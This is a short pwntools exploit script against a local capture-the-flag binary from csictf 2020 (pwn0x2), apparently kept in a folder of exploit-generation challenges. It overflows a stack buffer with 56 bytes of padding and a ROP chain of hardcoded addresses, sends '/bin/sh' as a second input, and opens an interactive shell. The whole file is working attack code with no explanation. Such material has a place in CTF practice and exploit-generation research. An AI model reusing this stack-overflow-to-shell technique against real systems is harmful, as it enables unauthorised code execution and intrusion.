from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/4_csictf2020_pwn0x2/csictf2020_pwn0x2")
pwn.gdb.attach(p)
p.recvuntil(b'Welcome to csictf! Where are you headed?\n')
payload = b"\x00" * 56
payload += p64(0x40101a) + p64(0x401263) + p64(0x404980) + p64(0x401060) + p64(0x401263) + p64(0x404980) + p64(0x401050)
payload += b"\n"
p.send(payload)
payload = b""
payload += b'/bin/sh\x00'
payload += b"\n"
p.send(payload)
p.interactive()
